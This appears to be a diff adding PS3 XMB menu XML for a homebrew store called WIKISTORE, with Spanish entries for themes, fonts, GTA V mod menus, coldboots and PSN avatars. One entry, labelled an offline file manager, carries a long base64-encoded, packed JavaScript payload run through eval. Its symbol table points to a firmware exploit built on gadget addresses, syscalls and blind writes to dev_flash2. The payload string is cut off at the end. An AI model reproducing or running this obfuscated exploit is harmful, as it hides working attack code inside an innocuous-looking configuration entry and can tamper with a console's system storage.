+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/font.png</String></Pair>
+				<Pair key="title"><String>Cambiar estilo de letras (SOLO HFW)</String></Pair>
+				<Pair key="info"><String>Descarga e instala fuentes (TTF/ttf)</String></Pair>
+				<Pair key="str_noitem"><String>msg_no_data</String></Pair>
+			</Table>
+			<Table key="GTA_Mod_Menu">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/modmenus/gtavlogo.png</String></Pair>
+				<Pair key="title"><String>GTA V 1.27 Mod Menus</String></Pair>
+				<Pair key="info"><String>Descarga e instala el mod menu de GTA V (Offline)</String></Pair>
+			</Table>
+			<Table key="No_PSN_Apps">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/nopsnlogo.png</String></Pair>
+				<Pair key="title"><String>No PSN Apps</String></Pair>
+				<Pair key="info"><String>Descarga e instala Apps que no requieren PSN</String></Pair>
+			</Table>
+			<Table key="wave_downloader">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/waves.png</String></Pair>
+				<Pair key="title"><String>Olas de Fondo WAVES (SOLO HFW)</String></Pair>
+				<Pair key="info"><String>Descarga y instala distintas waves (lines.qrc)</String></Pair>
+				<Pair key="str_noitem"><String>msg_no_data</String></Pair>
+			</Table>
+			<Table key="coldboot_downloader">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/coldboot.png</String></Pair>
+				<Pair key="title"><String>Coldboot Downloader (SOLO HFW)</String></Pair>
+				<Pair key="info"><String>Descarga y instala coldboots (Boot Logo de inicio y Sonido)</String></Pair>
+				<Pair key="str_noitem"><String>msg_no_data</String></Pair>
+			</Table>
+			<Table key="hombrew_downloader">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/hombrew.png</String></Pair>
+				<Pair key="title"><String>Hombrew Store</String></Pair>
+				<Pair key="info"><String>Descarga e instala Hombrew, Plugins y Emuladores (Aplicaciones caseras de PS3 con CFW compatible con HEN)</String></Pair>
+				<Pair key="str_noitem"><String>msg_no_data</String></Pair>
+			</Table>
+			<Table key="stores_usb">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/USB.png</String></Pair>
+				<Pair key="title"><String>Stores USB</String></Pair>
+				<Pair key="info"><String>En construccion</String></Pair>
+			</Table>
+			<Table key="avatares_psn">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/avatares.png</String></Pair>
+				<Pair key="title"><String>Descarga de avatares PSN</String></Pair>
+				<Pair key="info"><String>Dale un aire nuevo a tu perfil con uno de estos fantasticos avatares (Requiere instalar licencias rap)</String></Pair>
+			</Table>
+			<Table key="avatares_custom">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/avatarcustom.png</String></Pair>
+				<Pair key="title"><String>Descarga de avatares personalizados</String></Pair>
+				<Pair key="info"><String>Dale un aire nuevo a tu perfil con uno de estos fantasticos avatares custom</String></Pair>
+			</Table>
+			<Table key="iconspsn_downloader">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/logopsn.png</String></Pair>
+				<Pair key="title"><String>Logos de PSN (SOLO HFW)</String></Pair>
+				<Pair key="info"><String>Descarga e instala distintos logos de PSN (xmb_plugin_normal.rco)</String></Pair>
+				<Pair key="str_noitem"><String>msg_no_data</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>			
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="theme_downloader" 
+				attr="theme_downloader"
+				src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/temas/theme_downloader.xml#theme_downloader_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="wallpaper_downloader"
+				attr="wallpaper_downloader"
+				src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/wallpaper/wallpaper_downloader.xml#wallpaper_downloader_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="font_downloader"
+				attr="font_downloader"
+				src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/font/font_downloader.xml#font_downloader_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+                key="GTA_Mod_Menu"
+                attr="GTA_Mod_Menu"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/modmenus/GTA_Mod_Menu.xml#GTA_Mod_Menu_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+                key="No_PSN_Apps"
+                attr="No_PSN_Apps"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/psnapps/No_PSN_Apps.xml#No_PSN_Apps_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+				key="wave_downloader"
+				attr="wave_downloader"
+				src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/waves/wave_downloader.xml#wave_downloader_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+				key="coldboot_downloader"
+				attr="coldboot_downloader"
+				src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/coldboot/coldboot_downloader.xml#coldboot_downloader_items"
+				/>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="hombrew_downloader"
+				attr="hombrew_downloader"
+				src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/hombrew/hombrew_downloader.xml#hombrew_downloader_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+				key="stores_usb"
+				attr="stores_usb" 
+				src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/storesUSB/stores_usb.xml#stores_usb_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+                key="avatares_psn"
+                attr="avatares_psn"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/avatares/avatares_psn.xml#avatares_psn_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+                key="avatares_custom"
+                attr="avatares_custom"
+                src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/avatares/avatares_custom.xml#avatares_custom_items"
+				/>
+            <Query
+				class="type:x-xmb/folder-pixmap"
+				key="iconspsn_downloader"
+				attr="iconspsn_downloader"
+				src="xmb://localhost/dev_hdd0/game/WIKISTORE/USRDIR/xml/iconspsn/iconspsn_downloader.xml#iconspsn_downloader_items"
+				/>				
+			</Items>
+		</View>
+						
+<!-- Submenu Herramientas Avanzadas -->
+		
+		<View id="han_advanced_menu_main"> 
+		<Attributes> 
+		    <Table key="han_file_copier">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_file.png</String></Pair>
+				<Pair key="title"><String>Manager de Archivos Offline</String></Pair>
+				<Pair key="info"><String>Transferir y copiar archivos entre el USB y la PS3 HDD</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>javascript:eval(atob("ZXZhbChmdW5jdGlvbihwLGEsYyxrLGUscil7ZT1mdW5jdGlvbihjKXtyZXR1cm4oYzxhPycnOmUocGFyc2VJbnQoYy9hKSkpKygoYz1jJWEpPjM1P1N0cmluZy5mcm9tQ2hhckNvZGUoYysyOSk6Yy50b1N0cmluZygzNikpfTtpZighJycucmVwbGFjZSgvXi8sU3RyaW5nKSl7d2hpbGUoYy0tKXJbZShjKV09a1tjXXx8ZShjKTtrPVtmdW5jdGlvbihlKXtyZXR1cm4gcltlXX1dO2U9ZnVuY3Rpb24oKXtyZXR1cm4nXFx3Kyd9O2M9MX07d2hpbGUoYy0tKWlmKGtbY10pcD1wLnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxiJytlKGMpKydcXGInLCdnJyksa1tjXSk7cmV0dXJuIHB9KCdwIFQsMTUsMTcsMTgsMW8sMWYsMWcsMWgsMVI9ITEsNGk9IjRqIiwxQz1bXSxYPTAsTT03MCozMSwxcD00ayxHPTIqMUQsMUU9MCwxOT0wLHc9NGwsMXE9MCwycj0yMCwxRj0wLFk9NG0sNG49NG8sbz00cCwxYT0wLDRxPTEsNHI9MiwxUz00LDFyPTgsMUQ9NHMsMXM9NDAsMzM9NHQsNHU9NHYsMzQ9NHcsMzU9NHgsMzY9NHksMnM9NHosMzc9NEEsMnQ9NEIsMXM9NEMsMzg9NEQsWj0iPFo+IiwxVCwxVSwydT1cJzRFOjRGXCcsMnY9XCc0R1wnLDJ3PVwnLzJ4XCcsMnk9NEgsMzk9NEksMXQ9MCwxVj0wLDFXPTAsMVg9MCwxWT0wLDFaPTAsMjE9MCwyMj0wLDF1PTAsMXY9MCwyMz0wLDJ6PTAsM2E9NEosWj0iPFo+IiwxMj0iPDEyPiIsM2I9WisiPFU+PGI+NEsgNEwgM2MhPC9VPjwvYj4iLDNkPVorIjxVPjxiPjRNIDFiLi4uICIsM2U9XCclPC9iPjwvVT5cJywyQT00Tiw0Tz00UCw0UT00Uiw0Uz00VCw0VT00Viw0Vz00WCw0WT0wLDNmPTRaLDUxPTUzLDU0PTU1LDU2PTU3LDU4PTU5LDVhPTViLDVjPTVkLDNnPTVlLDVmPTVnLDJCPTVoLDFHPTVpLDFjPTVqLDJDPTVrLDNoPTVsLDJEPTVtLDNpPTVuLDNqPTVvLDFpPTVwLDNrPTVxLDNsPTVyLDNtPTVzO0IuNXQoXCc8M24+PDNvPjJFIC0gM3AgMjUgM3E8LzNvPjxVPjJFIC0gM3AgMjUgM3EgM3IgNXUgQCA1di01dy41eDwvVT48M3M+NXkgNXogM3IgNUEgMkU6IFcsIDVCLCA1QywgNUQ8LzNzPjxaPjwxMj48Yj41RSAzdCAzdTogPC9iPjwyNiBEPSIyRiIgM3Y9IjN3KCkiPjx5IEQ9IjVGIiAyNz0iMjciIEU9Ii8yOC8iPi8yOC88L3k+PHkgRD0iNUciIEU9Ii8yOS8iPi8yOS88L3k+PHkgRD0iNUgiIEU9Ii8yYS8iPi8yYS88L3k+PHkgRD0iNUkiIEU9Ii8yRy8iPi8yRy88L3k+PHkgRD0iNUoiIEU9Ii8xdy8iPi8xdy88L3k+PHkgRD0iNUsiIEU9Ii8zeC8iPi8zeC88L3k+PC8yNj48Yj4gPC9iPjwyYiAyYz0iM3kiIEQ9IjJkIiAySD0iMmQiIDN6PSIzQSIgM0I9IjUwIj48MTI+PDEyPjxiPjVMIDN0IDN1OiA8L2I+PDI2IEQ9IjJJIiAzdj0iM0MoKSI+PHkgRD0iNU0iIDI3PSIyNyIgRT0iLzJhLyI+LzJhLzwveT48eSBEPSI1TiIgRT0iLzI4LyI+LzI4LzwveT48eSBEPSI1TyIgRT0iLzI5LyI+LzI5LzwveT48eSBEPSI1UCIgRT0iLzJ4LyI+LzJHLzwveT48eSBEPSI1USIgRT0iLzF3LyI+LzF3LzwveT48LzI2PjxiPiA8L2I+PDJiIDJjPSIzeSIgRD0iMmUiIDJIPSIyZSIgM3o9IjNBIiAzQj0iNTAiPjwxMj48MTI+PDNEPjwyYiAyYz0iNVIiIEQ9IjNFIiAySD0iNVMiIDJmPSIyZiI+NVQtNVU8LzNEPjwxMj48MTI+PDNGIDVWPSIiPjwyYiAyYz0iNVciIEU9IjVYIiA1WT0iMkooTikiLz48LzNGPjwxeCBEPSIzRyI+PC8xeD48MXggRD0iMWIiPjwvMXg+PDF4IEQ9IjFIIj48LzF4PjwvNVo+PC8zbj5cJyk7ciAzdygpe3AgYT1CLkYoIjJGIikuRTs5KGE9PSIvMXcvIilCLkYoIjJkIikuRT0iM0gvM0kuM0oifXIgM0MoKXtwIGE9Qi5GKCIySSIpLkU7OShhPT0iLzF3LyIpQi5GKCIyZSIpLkU9IjNILzNJLjNKIjs5KGE9PSIvMngvIik2MCgiNjE6IDYyIDNLIDYzIDY0IDY1IDY2IDY3IDY4IDNLIGEgNjkgNmEuIDZiIDZjIDZkIDZlIDZmLiIpfXIgMksoYSl7cCBiPUIuNmcoIjZoIik7MUkocCB4PTA7eDxiLkE7eCsrKXtiW3hdLjZpPWF9fXIgM0woYSxiKXs5KGEpe2EuM009Yn19ciAyZyhhKXszTChCLkYoXCczR1wnKSxhKTs5KGEuNmooIjZrIikhPS0xKXsySygyTCl9fXIgM04oYSxiLGMpe3AgZD1ULlEoMVRbMF0sMikuMUooTik7cCBlPVQuUSgxVVswXSwyKS4xSihOKTtwIGY7OSgoVihkLDE2KSE9PTApJiYoVihkLDE2KT09PShWKGUsMTYpKSkpe3AgZz1CLkYoXCc2bFwnKTs5KGcpezkoZy4yZj09PU4pNm0uNm4oKX1mPWF9MTN7OShjKXs5KChWKGQsMTYpIT09VihlLDE2KSl8fChWKGQsMTYpPT09MCkpYis9Y31mPWJ9MmcoZil9ciAzTyhhKXtxIDcoMWMpK3UoTyxvKSs3KHcpKzcoYSkrSihJLG8pKzcoM2spfXIgM1AoYSxiLGMsZCxlLGYpe3AgZz1CLkYoXCczRVwnKTtwIHQ9W1wnXCcsXCdcJyxcJ1wnLFwnXCcsXCdcJ107OShiKXRbMF09MWooYitILGErQywxaSk7OShjKXRbMV09MWooYytILGErQywxaSk7OShkKXRbMl09MWooZCtILGErQywxaSk7OShlKXRbM109MWooZStILGErQywxaSk7OShmKXRbNF09MWooZitILGErQywxaSk7OShnKXs5KGcuMmY9PT1OKXEgdFswXSt0WzFdK3RbMl0rdFszXSt0WzRdKzNPKGEpfXFcJ1wnfXIgMk0oYSxiLGMsZCxlLGYsZyxoLGksail7OShqPT09Uil7aj13fXEgNygxYykrdShPLG8pKzcodykrdShDLG8pKzcoMUcpK3UoMUssbykrUCgxayxvKSt2KGEpK3YoaSkrdihnKSt2KGYpK3YoZSkrdihkKSt2KGMpK1AoSCxvKSt2KGgpK3UoMUwsbykrNyhiKSt1KEMsbykrNygyRCkrdShPLG8pKzcoaikrNyhZKStKKEksbyl9ciAyTihhLGIsYyxkLGUsZixnLGgsaSxqKXs5KGo9PT1SKXtqPXd9cSA3KDFjKSt1KE8sbykrNyh3KSt1KEMsbykrNygxRykrdSgxSyxvKStQKDFrLG8pK3YoYSkrdihpKSt2KGcpK3YoZikrdihlKStQKEgsbykrdihjKStQKEgsbykrdihoKSt1KEMsbykrNyhkLUgpKzcodykrSig2byxvKSs3KDNpKSt1KDZwLG8pKzcoYikrdShDLG8pKzcoMkQpK3UoTyxvKSs3KGopKzcoWSkrSihJLG8pfXIgM1EoYSxiLGMsZCxlLGYsZyxoLGksail7cSAyTyhoKzFzLGksMXIpKzFsKDM4LGEsaCwwLDAsMCwwLDAsMCkrMk8oaixoKzFzLDFTKSsxbCgydCxhLDMzLGMsMCwwLDAsMCwwKSsyTigzNyxjLGUsaCsxcyxmLDAsMCwwLDAsMCwwKSsyTSgycyxjLDAsMCwwLDAsMCwwLDAsMCwwKSsxaihmK0gsYiwwKSsxbCgydCxiLDM2LGQsMzUsaSwwLDAsMCkrMk4oMzQsZCxlLGgrMXMsZywwLDAsMCwwLDAsMCkrMk0oMnMsZCwwLDAsMCwwLDAsMCwwLDAsMCl9ciAzUihhLGIsYyxkLGUsZixnKXtxIDcoMkMpK3UoTyxvKSs3KHcpKzcoYS1JKSs3KHcpK3UoQyxvKSs3KDNtKSt1KDFLLG8pK0ooSSxvKSs3KGIpKzcoYykrNyhkKSs3KGUpKzcoZikrNyhnKSs3KFkpK0ooSSxvKX1yIDFqKGEsYixjLGQsZSxmKXs5KGQ9PT1SKXtkPXd9OShlPT09Uil7ZT13fTkoZj09PVIpe2Y9d31xIDNSKGEsdyx3LHcsdyxiLHcpKzcoM2wpK3UoMU0sMWEpK0ooSSwxYSkrNyhjKSt1KEMsMWEpKzcoZCkrNyhlKSs3KGYpKzcoYykrSihJLG8pfXIgNnEoYSl7cSA3KFkpK0ooSSxvKSsyaCgyQiwyLDAsMCwwLDAsMCwwLDAsMCwzUykrMWwoMnksYSwwLDAsMCwwLDAsMCwwKX1yIDNUKGEpezkoYSl7cSBhLjZyfX1yIDNVKGEpezkoYSl7cSAzVChhKX19ciAzVihhKXs5KGEpe3EgYS5FfX1yIDJQKGEpezkoYSl7cSAzVihhLjZzWzNVKGEpXSl9fXIgM1coKXtxIDJQKEIuRihcJzJGXCcpKX1yIDJRKGEpe3EgM1coKSthfXIgM1goKXtxIDJQKEIuRihcJzJJXCcpKX1yIDJSKGEpe3EgM1goKSthfXIgM1koYSxiLGMsZCxlKXs5KGE9PT1OKXsxRj0wOzFFPTA7MTk9MH05KFghPT0wKXszWihYKTtYPTB9MUM9W107MVQ9W107MVU9W107MW89MDsxZj0wOzFnPTA7MWg9MDtNPTcwKjMxOzFwPWI7Rz1jOzFFPWQ7MTk9ZTsxcSsrfXIgMWQoYSl7cSBTLjJpKGEpfXIgdihhKXtxIFMuMmkoYT4+MTYpK1MuMmkoYSl9ciA3KGEpe3EgdigwKSt2KGEpfVMuMW0uNDE9cigpe3EoXCcyU1wnK0spLlEoLTQpfTtTLjFtLjFKPXIoYSl7cCBiPVwnXCc7cCBpPTA7TChpPEsuQSl7OShhPT09Til7Yis9Sy4xeShpKS4yaigxNikuNDEoKX0xM3tiKz1LLjF5KGkpLjJqKDE2KX1pKz0xfXEgYn07Uy4xbS4xej1yKGEpezkoSy5BPDEpe3FcJ1wnfXAgYj1cJ1wnO3AgYz1cJ1wnO3AgaT0wO3AgZD1bXTs5KGE9PT1OKXtiPUt9MTN7Yj1LLjFKKCl9TCgoYi5BJTQpIT09MCl7Yis9XCcya1wnfTkoYi5RKGIuQS0zLDIpIT09XCcya1wnKXtiKz1cJzJTXCd9TChpPGIuQSl7Yz1iLlEoaSw0KTtkLjJUKFMuMmkoVihjLDE2KSkpO2krPTR9cSBkLjJVKFwnXCcpfTtTLjFtLjFBPXIoYSl7OShLLkE8MSl7cSAwfXAgYj1cJ1wnOzkoYT09PU4pe2I9S30xM3tiPUsuMUooKX1MKChiLkElNCkhPT0wKXtiKz1cJzJrXCd9OShiLlEoYi5BLTMsMikhPT1cJzJrXCcpe2IrPVwnMlNcJ31xIGIuQS8yfTtTLjFtLjFOPXIoYSxiKXtxIEsuUSgwLGEpK2IrSy5RKGErYi5BKX07Uy4xbS4ybD1yKGEpe3EgNDIgNDMoYSsxKS4yVShLKX07NDQuMW0uNDU9cigpe3AgYT1TKEspLjZ0KC9bNnVdLyk7OShhLkE9PT0xKXtxIGFbMF19cCB6PVwnXCcsNDY9SzwwP1wnLVwnOlwnXCcsMm09YVswXS40NyhcJy5cJyxcJ1wnKSwxTz00NChhWzFdKSsxOzkoMU88MCl7ej00NitcJzAuXCc7TCgxTysrKXt6Kz1cJzBcJ31xIHorMm0uNDcoL15cXC0vLFwnXCcpfTFPLT0ybS5BO0woMU8tLSl7eis9XCcwXCd9cSAybSt6fTtyIDQ4KGEsYixjKXtwIGQ9MDtwIGc9W107cCBpO3AgajtwIGg7MUkoaT1hLkE7aTtpLT0xKXtoPWFbaS0xXTsxSShqPTg7ajtqLT0xKXtnLjJUKGglMj8xOjApO2g9aD4+MX19Zy42digpO3Agaz1nLjJVKFwnXCcpO3AgbD0oMTw8KGItMSkpLTE7cCBzPVYoay4yVigwLDEpLDIpPy0xOjE7cCBlPVYoay4yVigxLDErYiksMik7cCBmPVYoay4yVigxK2IpLDIpOzkoZT09PSgxPDxiKS0xKXtkPWYhPT0wPzZ3OnMqNnh9MTMgOShlPjApe2Q9cyoybi4ybygyLGUtbCkqKDErZi8ybi4ybygyLGMpKX0xMyA5KGYhPT0wKXtkPXMqMm4uMm8oMiwtKGwtMSkpKihmLzJuLjJvKDIsYykpfTEze2Q9cyowfXEgZC40NSgpfXIgNDkoYSxiKXtwIGM9NDIgNDMoKGE+PjI0KSYxZSwoYT4+MTYpJjFlLChhPj44KSYxZSwoYSkmMWUsKGI+PjI0KSYxZSwoYj4+MTYpJjFlLChiPj44KSYxZSwoYikmMWUpO3EgNDgoYywxMSw1Mil9ciA0YShhLGIpe3Agbj0oYTw8MzIpfCgoYj4+MSktMSk7cSA0OShhLChuLWEpKX1yIDJXKGEsYil7OShCLkYoXCcxYlwnKSl7Qi5GKFwnMWJcJykuMUIuMnA9IjZ5KCIrNGEoYSxiKSsiKSJ9fXIgMVAoYSxiLGMpezkoQi5GKFwnMWJcJykpezJXKGEsYik7OSgxUj09PU4pe3AgeD1CLkYoXCcxYlwnKS4xQi4ycC5RKDYsYyk7cSB4fXEgQi5GKFwnMWJcJykuMUIuMnAuUSg2LGMpfX1yIDFIKGEpezkoQi5GKFwnMUhcJykpe0IuRigiMUgiKS4zTT0tNnooIjZBKDZCIithLjJqKDE2KSsiKSIpfX1yIDE0KCl7OSgxcTwycil7MmcoM2QrKCg2Qy8ycikqMXEpLjJqKCkrM2UpO1g9MlgoMkosNGIsMkwpfTEzezFxPTA7MmcoM2IpO1g9MH19ciAxUShhLGIsYyxkKXsyVyhjLGQpO3AgZT1CLkYoXCcxYlwnKS4xQi4ycC5RKDYsZCk7cCBpPTA7cCB0O3AgaztwIGY7cCBnO0woaTwoZS5BKjIpKXs5KGUuMXkoaS8yKT09PWIuMXkoMCkpe2Y9MDsxSShrPTA7azwoYi5BKjIpO2srPTZEKXs5KGUuMXkoKGkraykvMikhPT1iLjF5KGsvMikpezZFfWYrPTF9OShmPT09Yi5BKXtnPWMraSs0OzFJKHQ9MDt0PDFDLkE7dCs9MSl7OSgxQ1t0XT09PWcpe3EtMX19MUMuMlQoZyk7cSBnfX1pKz1DfXAgaD1jK2Q7cSAwfXIgMk8oYSxiLGMpe3EgMmgoM2csYSxiLGMsMCwwLDAsMCwwLDAsMU0pfXIgNkYoYSxiLGMsZCxlKXs5KGM9PT1SKXtjPXd9OShkPT09Uil7ZD13fTkoZT09PVIpe2U9d31xIDcoMkMpK3UoTyxvKSs3KGIpK0ooSSxvKSs3KGEtNkcpK3UoQyxvKSs3KDNqKSt1KDFNLG8pKzcoYykrNyhkKSs3KGUpKzcoWSkrSihJLG8pfXIgNGMoKXtxIDFuKCJcXDRkXFw2SCIpK3YoM2YpK3YoMkEpK3UoMUwsbykrNygyQSkrdSgxTSxvKX1yIDRlKCl7cSA3KDFpKSsxbigiXFw2SSIpfXIgMWwoYSxiLGMsZCxlLGYsZyxoLGksail7OShqPT09Uil7aj13fXEgNygxYykrdShPLG8pKzcodykrdShDLG8pKzcoMUcpK3UoMUssbykrUCgxayxvKSt2KGEpK3YoaSkrdihnKSt2KGYpK3YoZSkrdihkKSt2KGMpK1AoSCxvKSt2KGgpK3UoMUwsbykrNyhiKSt1KEMsbykrNygxYykrdShPLG8pKzcodykrdShDLG8pKzcoM2gpK3UoTyxvKSs3KGopKzcoWSkrSihJLG8pfXIgMmgoYSxiLGMsZCxlLGYsZyxoLGksaixrLGwsbSl7cCBuPTFMOzkobT09PVIpe209d305KGw9PT1SKXtsPXd9cSA3KDFjKSt1KE8sbykrNyh3KSt1KEMsbykrNygxRykrdSgxSyxvKStQKDFrLG8pK3YoaikrdihpKSt2KGcpK3YoZikrdihlKSt2KGQpK3YoYykrUChILG8pK3YoaCkrdSgxTCxvKSs3KGIpK3UoQyxvKSs3KDFjKSt1KE8sbykrNyhsKSt1KEMsbykrNyhhKSt1KGstbiwxYSkrNyhtKSs3KFkpK0ooSSxvKX1yIFAoYSxiKXtwIGM9XCdcJztwIGQ9MDtwIGU9MWQoYik7TChkPGEvNCl7Yys9ZS4ybCgyKTtkKyt9cSBjfXIgSihhLGIpe3AgYz1cJ1wnO3AgZD0wO3AgZT0xZChiKTtMKGQ8YS84KXtjKz1lLjJsKDQpO2QrK31xIGN9ciB1KGEsYil7cCBjPVwnXCc7cCBkPTA7cCBlPTFkKGIpO0woZDxhLzE2KXtjKz1lLjJsKDgpO2QrK31xIGN9ciAySihhKXsySyhOKTs2SnszWShhLDZLLDUvMioxRCwwKjFELDAqMUQpO3AgYj02TDsyWT1CLkYoIjJkIikuRTsyWj1CLkYoIjJlIikuRTtUPTJ1LjF6KCkrMnYuMXooKSsydy4xeigpKzJRKDJZKS4xeigpK1AoMWssMWEpKzJSKDJaKS4xeigpK1AoMWssMWEpK3UoMU0sMWEpKzcoWSkrSihJLG8pKzJoKDJCLDIsMCwwLDAsMCwwLDAsMCwwLDNTKSsxbCgyeSwzOSwwLDAsMCwwLDAsMCwwKSsxbigiXFw2TSIpO0woMW89PT0wKXs5KE08Ryl7MTQoKTtxfVQ9VC4xTigwLDFkKDZOKSk7MW89MVEoIlQiLFQsMXAsRyk7TS09R30xdD0xbzsxVj0xdCsydS4xQSgpLUg7MVc9MVYrMnYuMUEoKTsxWD0xVysydy4xQSgpOzFaPTFYKzJRKDJZKS4xQSgpOzFZPTFaKzFTOzIxPTFZKzFyOzIyPTIxKzJSKDJaKS4xQSgpOzF1PTIyKzFTOzFUWzBdPSgxdS0xdCtJKS8yOzF2PTF1KzFyOzFVWzBdPSgxdi0xdCsxaykvMjsyMz0xdisxcio2Tzsyej0yMysxcio2UDsxNT00YygpKzFsKDNhLDF0LDFWLDFXLDAsMCwwLDAsMCkrM1EoMVgsMjEsMVosMjIsYiwxWSwxdSwyMywxdiwxditJKSszUCgyeiwxdSkrNGUoKTtMKDFmPT09MCl7OShNPEcrMTkpezFGKys7OSgoMUYlMTApPT09MCl7MUUrPTA7MTkrPTB9MTQoKTtxfTE1PTE1LjFOKDAsMWQoNlEpKTsxZj0xUSgiMTUiLDE1LDFwKzFFLEcrMTkpOzkoMWY9PS0xKTkoTTxHKzE5KXsxRisrOzE0KCk7cX1NLT1HKzE5fTE3PTFuKCJcXDZSXFw2UyIpK3UoNlQsNlUpK3YoMWYpKzFuKCJcXDZWIik7TCgxZz09PTApezkoTTxHKXsxNCgpO3F9MTc9MTcuMU4oMCwxZCg2VykpOzFnPTFRKCIxNyIsMTcsMXAsRyk7OSgxZz09LTEpOShNPEcpezE0KCk7cX1NLT1HfTE4PTFuKCJcXDRkXFw2WCIpK3YoMWcpKzFuKCJcXDZZIik7TCgxaD09PTApezkoTTxHKXsxNCgpO3F9MTg9MTguMU4oMCwxZCg2WikpOzFoPTFRKCIxOCIsMTgsMXAsRyk7OSgxaD09LTEpOShNPEcpezE0KCk7cX1NLT1HfXAgYz0xUCgxZi1ILDcxLDE1LkEpO3AgeD0xUCgxby1ILDMwLFQuQSk7cCBkPTFQKDFnLUgsMzAsMTcuQSk7cCBmPTFQKDFoLUgsMzAsMTguQSk7OSgoZD09PTE3KSYmKGY9PT0xOCkmJih4PT09VCkmJihjPT09MTUpKXs5KFghPT0wKXszWihYKX00ZigpfTEzezE0KCl9fTcyKGUpezFSPU47MVI9Mkx9fXIgNGYoKXsyWCgxSCw0YiwxaCk7MlgoM04sNzMsWisiPFU+PGI+PDJxIDFCPVwnNGc6NzRcJz4yNSA0aCA3NSE8L2I+PC9VPjwvMnE+IixaKyI8VT48Yj48MnEgMUI9XCc0Zzo3NlwnPjI1IDRoIDNjITwvYj48L1U+PC8ycT4iLCIiKTtYPTA7MXE9MH0nLDYyLDQ0MSwnfHx8fHx8fGhleGR3MmJpbnx8aWZ8fHx8fHx8fHx8fHx8fHxkYnl0ZTQxfHZhcnxyZXR1cm58ZnVuY3Rpb258fHxmaWxsX2J5XzE2Ynl0ZXN8aGV4dzJiaW58Z3RlbXBfYWRkcnx8b3B0aW9ufHxsZW5ndGh8ZG9jdW1lbnR8MHgxMHxpZHx2YWx1ZXxnZXRFbGVtZW50QnlJZHxzZWFyY2hfc2l6ZXwweDR8MHg4fGZpbGxfYnlfOGJ5dGVzfHRoaXN8d2hpbGV8c2VhcmNoX21heF90aHJlc2hvbGR8dHJ1ZXwweDYwfGZpbGxfYnlfNGJ5dGVzfHN1YnN0cnxudWxsfFN0cmluZ3x4dHJhX2RhdGF8aDF8cGFyc2VJbnR8fHRfb3V0fHNwX2V4aXR8aHJ8fHxicnxlbHNlfGxvYWRfY2hlY2t8c3RhY2tfZnJhbWV8fGp1bXBfMnxqdW1wXzF8c2VhcmNoX3NpemVfZXh0fGRieXRlMDB8ZXhwbG9pdHxnYWRnZXRfbW9kMl9hZGRyfGhleGgyYmlufDB4RkZ8c3RhY2tfZnJhbWVfYWRkcnxqdW1wXzJfYWRkcnxqdW1wXzFfYWRkcnxnYWRnZXRfbW9kOF9hZGRyfHZhbGlkYXRlX3dvcmRfZnJvbV9wdHJ8MHhDfHN5c2NhbGx8cHJvdG90eXBlfHVuZXNjYXBlfHh0cmFfZGF0YV9hZGRyfHNlYXJjaF9iYXNlfHRvdGFsX2xvb3BzfGR3b3JkX3NpemV8c3RhdF9zaXplX29mZnNldHxmbGFzaF9wYXJ0aXRpb25fYWRkcnx0ZW1wbGF0ZV8xX2ZpbGVfYmxpbmRfd3JpdGVsZW5fYWRkcnxudWxsX2FkZHJ8ZGV2X2ZsYXNoMnxkaXZ8Y2hhckNvZGVBdHxjb252ZXJ0fGNvbnZlcnRlZFNpemV8c3R5bGV8b2Zmc2V0X2FycmF5fG1ieXRlc3xzZWFyY2hfYmFzZV9vZmZ8ZnJhbWVfZmFpbHN8Z2FkZ2V0X21vZDFfYWRkcnx0cmlnZ2VyfGZvcnx0b0FzY2lpfDB4NTB8MHgyMHwweDcwfHJlcGxhY2VBdHxtYWd8Y2hlY2tNZW1vcnl8ZmluZEpzVmFyaWFibGVPZmZzZXR8ZGVidWd8d29yZF9zaXplfHN0b3JlX2lkeF9hcnIxfHN0b3JlX2lkeF9hcnIyfGZzX2FkZHJ8bW91bnRfcGF0aF9hZGRyfHRlbXBsYXRlXzFfZmlsZV91c2JfYWRkcnx0ZW1wbGF0ZV8xX